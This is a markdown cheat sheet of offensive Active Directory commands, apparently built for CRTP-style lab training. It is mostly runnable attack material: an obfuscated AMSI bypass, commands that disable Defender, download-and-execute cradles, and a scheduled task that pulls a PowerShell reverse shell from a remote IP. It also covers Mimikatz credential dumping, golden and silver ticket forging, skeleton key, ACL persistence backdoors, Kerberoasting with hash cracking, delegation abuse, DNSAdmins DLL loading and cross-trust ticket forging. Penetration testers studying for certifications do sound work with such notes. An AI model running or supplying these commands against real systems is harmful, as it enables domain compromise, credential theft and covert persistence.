# Commands
- [Powershell Basics](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#powershell-basics)
- [Running Powershell - AMSI and EP Bypass](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#running-powershell)
- [Download Cradles](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#tool-download)
- [Active Directory Enumeration](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#active-directory-enumeration)
  - [Machines](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#machines)
  - [Users](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#user-search)
  - [Groups](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#group-membership)
  - [Shares, GPOs etc](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#shares-gpos-etc)
  - [Users and Groups of Machines](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#users-and-groups-of-machines)
  - [User Hunting](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#user-hunting)
- [BloodHound](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#bloodhound)
- [Local PrivEsc](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#priv-esc)
- [Lateral Movement](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#lateral-movement)
    - [Pass-the-hash](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#mimikatz-pass-the-hash)
    - [Pass-the-ticket](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#mimikatz-pass-the-ticket)
- [Mimikatz and Tickets](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#mimikatz---tickets)
  - [DCSync](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#dcsync)
  - [Golden](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#golden)
  - [Silver](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#silver)
  - [Invoke-Mimikatz.ps1](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#invoke-mimikatz)
  - [Misc Attacks](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#mimikatz---misc-attacks)
- [Check ACLs](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#check-acls)
- [Persistence using ACLs - Rights Abuse (AdminSDHolder and Domain Replication Privileges)](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#persistence-using-acls---rights-abuse)
- [Persistence using ACLs - Security Descriptors (Remote WMI, PS Remoting, and Remote Registry)](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#persistence-using-acls---security-descriptors)
- [Privilege Escalation - Kerberoasting](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#kerberoasting)
- [Privilege Escalation - Targeted Kerberoasting - AS-REPs](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#targeted-kerberoasting---as-reps)
- [Privilege Escalation - Target a User via Kerberoasting - Set an SPN](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#privilege-escalation---target-a-user-via-kerberoasting-set-spn)
- [Kerberos Delegation](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#kerberos-delegation)
  - [Unconstrained delegation](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#unconstrained-delegation)
    - [Printer Bug](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#printer-bug---why-wait-when-you-can-spool)
  - [Constrained delegation](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#constrained-delegation)
    - [Rubeus SFU - Constrained Delegation User](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-sfu---constrained-delegation-user)
    - [Rubeus SFU - Constrained Delegation Machine](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-sfu---constrained-delegation-machine)
- [DNS Admins](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#dns-admins)
- [Forest Trusts](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#forests-and-trusts)
  - [Within Forest - Child to Parent Domain/Forest Root(https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#child-to-parent---intra-forest-trust)
  - [Across Forests - Directional Trusts and other stuff]
- [MS SQL](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#ms-sql)
- [Forest Persistence - DC Shadow]()
- [Certificates](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#certificates)

# Powershell Basics

#### Help
```
Get-Help Get-Help
Get-Help *
Get-Help process
Get-Help Get-Item -Full
Get-Help Get-Item -Examples
```
#### Modules
```Import-Module modulepath```

```Get-Command -Module <modulename>```



#### Filter property string search

```Get-ADUser -Filter * | Where-Object {$_.Name -like '*smith*'}```
  
```Get-Service | Where-Object {$_.DisplayName -like '*Windows*'}```



```Get-Process | Select-Object -Property * | Where-Object { $_.psobject.Properties.Value -like '*chrome*' }```

```Get-Process | Select-Object -Property * | Where-Object { $_.* -like '*chrome*' }```

```Get-DomainUser  | Select-Object -Property * | Where-Object { $_.* -like '*admin*' }```

# Running Powershell
#### AMSI Bypass
https://amsi.fail/

Then obfuscate with -  https://github.com/danielbohannon/Invoke-Obfuscation
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ); ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```



#### EP Bypass
Start PowerShell from cmd.exe:

```Powershell -c <cmd>```

```powershell.exe -ep bypass```

OR If already running-

```Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass```

```Set-ExecutionPolicy -Scope Process -ExecutionPolicy Restricted```

```$Env:PSExecutionPolicyPreference = 'Bypass'```

#### MS Bypass
```Set-MpPreference -DisableIOAVProtection $true```

```Set-MpPreference -DisableRealtimeMonitoring $true```

#### Kerberos Tickets
```klist```

# Tool Download

#### Execution Cradle
```IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/conma293/mvp/main/1.ps1')```

#### Download Files
```(new-object System.Net.Webclient).DownloadFile("https://raw.githubusercontent.com/conma293/mvp/main/1.ps1", "C:\Windows\Temp\1.ps1")```

# Active Directory Enumeration

```
$ADClass=[System.DirectoryServices.ActiveDirectory.Domain]
$ADClass::GetCurrentDomain()
```

[AD Enumeration Scripts](https://github.com/conma293/ActiveDirectory)
#### Powerview
```. .\PowerView.ps1```

Readme - https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

#### AD Module
Import AD Module without RSAT:

```iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory```

* * * 
#### Machines

```Get-DomainComputer```
```Get-DomainComputer –OperatingSystem "*Server 2016*" ```
```Get-DomainComputer -Ping```
```Get-DomainComputer -FullData```

```Get-ADComputer -Filter * | select Name```

```Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' - Properties OperatingSystem | select Name,OperatingSystem```

```Get-ADComputer -Filter * -Properties *```

```Get-ADComputer -Filter *  -Properties DNSHostName | %{Test- Connection -Count 1 -ComputerName $_.DNSHostName}```

#### User Search
```Get-DomainUser```
```Get-DomainUser –Identity bob```

```Get-ADUser -Filter * -Properties *```
```Get-ADUser -Identity bob -Properties *```

#### Group Membership
```net localgroup administrators```

```Get-DomainGroup -FullData```
```Get-DomainGroup "admin"```
```Get-DomainGroup –UserName "bob"```

```Get-DomainGroupMember -Identity "Domain Admin*" -Recurse```

```Get-DomainGroupMember -Identity "Domain Admin*" | select GroupName, MemberName```

```Get-ADGroupMember -Identity "Domain Admins" -Recursive```




#### Shares, GPOs, etc


```Invoke-ShareFinder –Verbose```

```Invoke-FileFinder –Verbose```

```Get-NetFileServer```

```Get-NetGPO```

* * *
#### Users and Groups of Machines
```Get-NetLocalGroup -ComputerName <hostname>``` List all the local groups on a machine (needs admin privs on non-
dc machines)

```Get-NetLocalGroupMember -ComputerName <hostname>``` Get members of all the local groups on a machine (needs admin privs on non-dc machines)


```Get-NetLoggedon –ComputerName <hostname>``` (needs localadmin)

```Get-LoggedonLocal -ComputerName <hostname>``` (needs localadmin)
#### User Hunting

```Find-LocalAdminAccess``` - find all machines on current domain where current user has localadmin access

```Find-LocalAdminAccess -CheckAccess``` - list sessions where you have access to the machine

```Invoke-UserHunter``` for users/groups you want - will show all active sessions for users/users of specified groups

```Invoke-UserHunter -GroupName "RDPUsers"```

* * *
#### Bloodhound

SharpHound Collectors - https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/
```
. .\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.lab -OutputDirectory C:\Temp -ZipFileName loot123.zip
```

* * * 
# Local Privilege Escalation

Run PowerUp - are you already localadmin?
```
. ./PowerUp.ps1
Invoke-AllChecks 
```


```Get-UnquotedService```

```Get-ModifiableService```

```Get-ModifiableServiceFile | select servicename, abusefeature```

# Lateral Movement
#### PowerShell Remoting
```Find-LocalAdminAccess -CheckAccess```

```Enter-PSSession –Computername Server1```

```$Sess = New-PSSession –Computername Server1```

```Invoke-Command –Session $Sess –ScriptBlock {whoami;host name;ipconfig}```

```Invoke-Command –Session $Sess –ScriptBlock {$Proc = Get- Process}```

```Invoke-Command –Session $Sess –ScriptBlock {$Proc.name}```

```Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess ```

If functions not on remote host:-

```. ./Invoke-Mimikatz.ps1```
```Invoke-Command –Session $Sess -ScriptBlock ${function:Invoke-Mimikatz}```

##### Copy Across
```Copy-Item ./Invoke-Mimikatz.ps1 /Server1.local/c$/temp```
``` ls //Server1.local/c$/temp```

* * *



#### Mimikatz Pass-the-hash
```Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"' ```

#### Mimikatz Pass-the-ticket
```Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\userX\[0;6f5638a]-2-0-60a10000- Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'```

#### Rubeus Pass-the-ticket
```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```

```Rubeus.exe asktgt /user:webadmin /rc4:cbdc389e6f34c671fadb1b13edbc5a61 /ptt```

```Rubeus.exe asktgt /user:webadmin /password:Password01 /ptt```


* * *

# Mimikatz 
https://adsecurity.org/?page_id=1821

NTLM == RC4

#### DCSync
Does NOT need localadmin to run, just DC Replication privs:
```
lsadump::dcsync /user:Administrator
```

Golden - 
```
lsadump::dcsync /user:ecorp\krbtgt
```
#### Golden
Jump to DC to dump krbtgt hash or via DCSync above -

```psexec.exe \\dc01 cmd.exe```

```Privilege::debug```

```lsadump::lsa /patch```

**Note:** The top "Administrator" account dumped by Mimikatz with this command is actually the DSRM of the DC

Now back on attacker machine you use the NTLM of krbtgt account to create Golden Tickets:-

```
kerberos::golden 
/user:DonaldDuck /domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
538555522 /krbtgt:731a061e57100b658bc59d71f5176e93
/id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

#### Silver
SPNs - https://adsecurity.org/?page_id=183
```
kerberos::golden 
/domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
538555522 /target:dc01.ecorp.local /service:HOST 
/rc4:731a061e57100b658bc59d71f5176e93 /user:Administrator /ptt
```
#### Scheduled Task Creation via TGS
With HOST Service access you can now create a scheduled task on the target machine:-

```
schtasks /create /S dc01.ecorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Updater123" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.3.111:8080/Invoke-PowerShellTcp.ps1'')'"
```

```
schtasks /Run /S dc01.ecorp.moneycorp.local /TN "Updater123"
```
Note: Similar to PTH for applicable kerberos systems 

# Invoke Mimikatz

#### Patch script if VirtualAlloc Error
```
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/conma293/mvp/main/Invoke-Mimikatz_MOD.ps1")
```

Patched script working available here - [Tool dump](https://github.com/conma293/mvp) 



https://github.com/mitre/caldera/issues/38#issuecomment-396055260

https://rzemieniecki.wordpress.com/2019/08/02/evading-edr-av-software-with-invoke-mimikatz-ps1/

* * *

```. ./Invoke-Mimikatz.ps1```

```Invoke-Mimikatz -ComputerName DC01```

```Invoke-Mimikatz -ComputerName DC01 -DumpCreds```

When invoking command make sure to wrap in double AND single quotes - 

```Invoke-Mimikatz -ComputerName DC01 -Command "kerberos::list"```

```Invoke-Mimikatz -Command '"lsadump::dcsync /user:Bob"'```

``` 
Invoke-Mimikatz -Command '"kerberos::golden 
/user:MickeyMouse /domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
538555522 /krbtgt:731a061e57100b658bc59d71f5176e93
/id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
# Mimikatz - Misc Attacks

#### Skeleton Key Attack:-

```Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc01.ecorp.local```

May require Kernel Driverload onto the host if process protected:-

```
privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
!-
```
 #### MemSSP
 MemSSP logs local logons, service account and machine account passwords in clear text on the target server:-
 
```Invoke-Mimikatz -Command '"misc::memssp"'``` - Logs local logons to C:\Windows\system32\kiwissp.log


* * *


# Check ACLs
Check Domain Admins permissions for a specific user:

```Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'Mary'}```

```Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object { $_.IdentityReference -match 'Mary' }```

**Note:**  ```Where-Object```  ==  ``` ? ```

DCSync: 

```Get-DomainObjectAcl -DistinguishedName "dc=bcorp,dc=ecorp,dc=lab" -ResolveGUIDs | ? {($_.IdentityReference -match "Mary") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}```

# PowerView tips on DomainObjectACL:
#### retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
```Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}```

#### enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names
```Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local```

#### grant user 'will' the rights to change 'matt's password
```Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose```

#### audit the permissions of AdminSDHolder, resolving GUIDs
```Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs```

#### backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
```Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All```
* * *
#### Recurse through all ACEs for user/group:

This appends the resolved user or group name to each ACE and recurses through:
```
Get-DomainObjectAcl -Identity Josh -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
```

* * * 

# Persistence Using ACLs - Rights Abuse
#### AdminSDHolder 

Add FullControl permissions ("GenericAll" rights) for an arbitrary user to AdminSDHolder 

```Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Mary -Rights All -Verbose``` - PowerView

```Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=bcorp,DC=ecorp,DC=lab' -Principal Mary -Verbose``` - AD Module

#### Domain Replication Privileges 
Add DCSync rights ("Replicating Directory Changes*" (x3) permissions) for an arbitrary user 

https://adsecurity.org/?p=1729

```Add-ObjectAcl -TargetDistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -PrincipalSamAccountName Mary -Rights DCSync -Verbose``` - PowerView

```Set-ADACL -DistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -Principal Mary -GUIDRight DCSync -Verbose``` - AD Module


# Persistence Using ACLs - Security Descriptors


#### Remote WMI - Nishang
link to Nishang- https://github.com/samratashok/nishang/tree/master/Backdoors

```
. .\Set-RemoteWMI.ps1

Set-RemoteWMI -UserName Josh -ComputerName dc01.ecorp.lab -namespace 'root\cimv2' -Verbose
```
```
gwmi -class win32_operatingsystem -ComputerName dc01.ecorp.lab
```


#### PS Remoting
link to Nishang - https://github.com/samratashok/nishang/tree/master/Backdoors

```
. .\Set-RemotePSRemoting.ps1

Set-RemotePSRemoting -UserName Josh -ComputerName dc01.ecorp.lab -Verbose
```

Note: It may throw an error, check access anyway


#### Remote Registry - DAMP
link to DAMP - https://github.com/HarmJ0y/DAMP

https://posts.specterops.io/remote-hash-extraction-on-demand-via-host-security-descriptor-modification-2cf505ec5c40

```
. .\DAMP-master\Add-RemoteRegBackdoor.ps1

Add-RemoteRegBackdoor -ComputerName dc01.ecorp.lab -Trustee Josh -Verbose
```

```
. .\DAMP-master\RemoteHashRetrieval.ps1

Get-RemoteMachineAccountHash -ComputerName dc01.ecorp.lab -Verbose
```


# Kerberoasting
#### Find SPN
```Get-DomainUser –SPN```

OR ActiveDirectory module:

```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```


#### Get SPN
```Get-DomainSPNTicket -SPN MSSQLSvc/dbsrv01.ecorp.lab```

```“HTTP/websrv01.ecorp.lab”,“HTTP/websrv02.ecorp.lab” | Get-DomainSPNTicket```

```Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat JTR```

OR

```Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityTok en -ArgumentList "MSSQLSvc/dbsrv01.ecorp.lab"```
#### Check and Dump Tickets

```klist```

Export all tickets using Mimikatz:

```Invoke-Mimikatz -Command '"kerberos::list /export"'```


#### Invoke-Kerberoast
https://blog.harmj0y.net/powershell/kerberoasting-without-mimikatz/

```
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
```

```Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII Output_TGSs```

#### Crack SPN

https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py

Crack the Service account password:

``` 
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-
40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi

```


* * *

#### Rubeus
https://blog.harmj0y.net/redteaming/kerberoasting-revisited/

```.\Rubeus.exe kerberoast```

* * *


# Targeted Kerberoasting - AS-REPs
https://harmj0y.medium.com/roasting-as-reps-e6179a65216b

```Get-DomainUser -PreauthNotRequired -Verbose```

OR using ActiveDirectory module:

```Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} - Properties DoesNotRequirePreAuth```

* * *

OR Find-InterestingDomainAcl shows us all interesting ACLs modifiable by the current user:

```Find-InterestingDomainAcl -ResolveGUIDs | select ObjectDN,ActiveDirectoryRights,IdentityReferenceName```

```Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "GenericAll"}```

```Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}```

* * *

#### Get AS-REPs

```.\Rubeus.exe asreproast```

#### Cracking hashes

```./john vpn1user.txt --wordlist=wordlist.txt```

```john --wordlist /usr/share/wordlists/rockyou.txt --format=krb5tgs dump```

* * * 

#### Disabling Pre-Auth

```Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose```

```Get-DomainUser -PreauthNotRequired -Verbose```

* * * 

# Privilege Escalation - Target a User via Kerberoasting Set-SPN

```Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}```

Check if the user already has an SPN:

```Get-DomainUser -Identity supportuser | select serviceprincipalname```

OR using ActiveDirectory module:

```Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName```

#### Set arbitrary SPN for user

•  Set an SPN for the user (must be unique for the domain):

```Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}```

OR using ActiveDirectory module:

Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='ops/whatever1'}

#### Request a TGS now the user has an SPN 

```
Add-Type -AssemblyNAme System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityTok en -ArgumentList "ops/whatever1"
```

OR 

```Get-DomainSPNTicket -SPN ops/whatever1```

#### Check, export, and crack the ticket
```klist```

```Invoke-Mimikatz -Command '"kerberos::list /export"'```

```
python.exe .\tgsrepcrack.py .\10k-passwords.txt '.\2-
40a10000-student1@ops~whatever1- dollarcorp.moneycorp.LOCAL.kirbi'
```

# Kerberos Delegation
A Service which requires authentication from the user to access a subsequent service (e.g., a user accessing a SQL database via an HTTP service). In this case delegation is required and the first service (HTTP) will impersonate the user to authenticate to the second service (SQL). This is achieved by enclosing the users TGT within the TGS which is encrypted with the hash of the service account.

Basically this means if we have compromised a service account/machine and a Domain Admin connects, we are able to obtain their TGT as it is embedded inside the Delegated TGS Ticket. 

Once the delegated TGS is received by the service machine/account with Delegation enabled, the enclosed user TGT is extracted and stored in the machine’s lsass process. This means if we have localadmin on the service machine, we can obtain this TGT by dumping creds.

https://adsecurity.org/?p=1667

https://blog.harmj0y.net/redteaming/another-word-on-delegation/

# Unconstrained Delegation

NOTE: Domain Controllers will always report as having delegation enabled.

#### Find Machines with Unconstrained Delegation
```Get-DomainComputer -UnConstrained```

OR Using ActiveDirectory module:

```Get-ADComputer -Filter {TrustedForDelegation -eq $True}```

```Get-ADUser -Filter {TrustedForDelegation -eq $True}```

#### Compromise the server(s) where unconstrained delegation is enabled 
```Enter-PSSesstion -ComputerName appsrv01```

```Find-LocalAdminAccess```

```Invoke-UserHunter -ComputerName appsrv01 -Poll 100 -UserName Administrator -Delay 5 -verbose```

#### Dump creds 
See if theres any interesting accounts already resident in lsass:

```Invoke-Mimikatz –Command '"sekurlsa::tickets"'```

We must trick or wait for a domain admin to connect to a service on the compromised host and then dump the creds:

```Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'```

#### PTT
We can then reuse the DA token:

```
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

* * *

#### Rubeus
```Get-NetComputer -UnConstrained```

```
Rubeus triage
Rubeus monitor /monitorinterval:1 /nowrap
SpoolSample DC01 helpdesk.lab
Rubeus ptt /ticket:
klist
```
* * *

# Printer bug - why wait when you can spool?
https://github.com/leechristensen/SpoolSample

compiled binary available here - [Tool dump](https://github.com/conma293/mvp) 

```
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/exploitation/Invoke-SpoolSample.ps1")
```

* * * 

# Constrained Delegation
This is when a TGT can be forwarded only to a specified Service defined in the specific User/Machine/Resource msds-allowedtodelegateto property.

It also introduces s4u - which allows a Service to request a TGS for itself on behalf of a user who may or may not be authenticating via Kerberos.

```Get-DomainUser –TrustedToAuth```

```Get-DomainComputer –TrustedToAuth```

```Get-DomainUser patsy -Properties samaccountname,msds-allowedtodelegateto | Select -Expand msds-allowedtodelegateto```

```Get-DomainComputer WEBSRV01 | Select name,serviceprincipalname,msds-allowedtodelegateto```

Or using ActiveDirectory module:

```Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo```

* * *

#### Requesting a (constrained delegation) TGT:

```./Rubeus.exe asktgt /domain:ecorp.lab /user:webadmin /rc4:cbdc389e6f34c671fadb1b13edbc5a61```

#### Using S4U and the previous TGT, request a TGS:

Kekeo:
```
tgs::s4u /tgt:CERT_WE_STOLE.kirbi
/user:user_we_are_impersonating@ecorp.lab
/service:ServiceListedIn{msDS-AllowedToDelegateTo}
```
* * * 

#### Rubeus SFU - constrained delegation user 

Rubeus (optional ```/ptt``` ```/domain``` ```/dc```):

```
Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_impersonating /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo}
```


Example:

```Rubeus.exe tgtdeleg```
https://github.com/GhostPack/Rubeus#tgtdeleg

```Rubeus.exe s4u /ticket: /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt```

```klist```

#### Rubeus SFU - constrained delegation machine

We could also just do it all in one command - Rubeus does all the steps for us!

_in possession of constrained delegation machine account NTLM hash:_

```
Rubeus.exe s4u /user:WEBSRV01$ /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:SQLDatabase /ptt
```



**"If a ```/user``` and ```rc4/aes256``` hash is supplied, the ```s4u``` module performs an ```asktgt``` action first, using the returned ticket for the steps following. If a TGT ```/ticket:X``` is supplied, that TGT is used instead."**
-https://github.com/GhostPack/Rubeus#s4u

* * *

There is also a possiblity of requesting a TGS for more services than is specified in {msDS-AllowedToDelegateTo} IF there is no SNAME validation:


```
Rubeus.exe s4u /ticket:adminsrv$_LOCALxxx.kirbi /impersonateuser:Administrator /domain:ecorp.lab /msdsspn:cifs/dc01.ecorp.lab|ldap/dc01.ecorp.lab
```

**NOTE:** You then save both to disk or output-String, and import the one you want to impersonate i.e., LDAP

* * * 

Inject PTT:

``` Invoke-Mimikatz -Command '"kerberos::ptt C:\Windows\System32\TGS_<snip>_.kirbi"' ```

OR

``` Rubeus.exe ptt /ticket:C:\Windows\System32\TGS_LDAP_adminsrv$<snip>_.kirbi ```



# DNS Admins
https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83

It is possible for the members of the DNSAdmins group to load arbitrary DLLs with the privileges of dns.exe (SYSTEM).
Often the DC also serves as the DNS, meaning we have a pathway to the DC and Domain Admin accounts.

BUT - we also need DNSAdmins members to be able to restart the DNS service which is not enabled by default..

Enumerate the members of the DNSAdmins group:

```Get-NetGroupMember -GroupName "DNSAdmins"```

Using DNSServer module (needs RSAT DNS):

```dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.50.100\dll\mimilib.dll```

```$dnsettings = Get-DnsServerSetting -ComputerName dcorp-dc -Verbose -All```

```$dnsettings.ServerLevelPluginDll = "\\172.16.50.100\dll\mimilib.dll"```

```Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose```


# Forests and Trusts
A Forest is the Security Boundary as defined by MS.

Across Domains - Implicit Trust

Across Forests - Trust needs to be established

When requesting services from other domains - the TGT is Requested and received from the DC within the current users domain, the TGS corresponding to a service outside of the current domain is then Requested to the same DC, and an Inter-Realm TGT is provided in response. In possession of the Inter-realm TGT, a TGS for the service is requested from that other domain's DC wherein the service resides. This TGS is then presented directly to the cross-domain service machine.

The Inter-realm TGT is encrypted with the trust key which if compromised, can be reused to forge cross-domain tickets.

Essentially if you own DA on any Domain within a Forest, you own every domain within that forest as well as the Forest root itself. This is intended by design as the Forest is the security boundary defined by MS.

https://adsecurity.org/?p=1588

https://blog.harmj0y.net/redteaming/the-trustpocalypse/

https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d

https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/

https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1

* * *

#### Child to Parent - Intra-Forest Trust
Therefore, if we get the trust key we can forge an Inter-realm TGT and traverse domains. There are multiple ways to achieve this once in possession of DA prvileges:


On the DC:
```Invoke-Mimikatz -Command '"lsadump::trust /patch"'```

OR via DCSync:
```Invoke-Mimikatz -Command '"lsadump::dcsync /user:ecorp\bcorp$"'```

"by querying the FOREIGN_DOMAIN_SHORTNAME$ account_": 

-https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d

```Invoke-Mimikatz -Command '"lsadump::dcsync /domain:external.local /user:SUB$"'```

We are looking for the **IN** Trust key (from external to current domain), and can then inject this into memory using ```/rc4:``` OR ```/krbtgt:```

```/sids:``` is the SID of the Parent domain and Enterprise Admins RID ```-519```


trust tkt -
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:child.parent.lab /sid:S-1-5-21-<currentdomainSID> /sids:S-1-5-21-<parentdomainSID>-519 /rc4:f052addf1d43f864a7d0c21cbce440c9 /service:krbtgt /target:parent.lab /ticket:C:\Temp\trust_tkt.kirbi"'
```

krbtgt -
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:child.parent.lab /sid:S-1-5-21-<currentdomainSID> /sids:S-1-5-21-<parentdomainSID>-519 /krbtgt:f052addf1d43f864a7d0c21cbce440c9 /ticket:C:\Temp\krbtgt_tkt.kirbi"'
```

# MS SQL

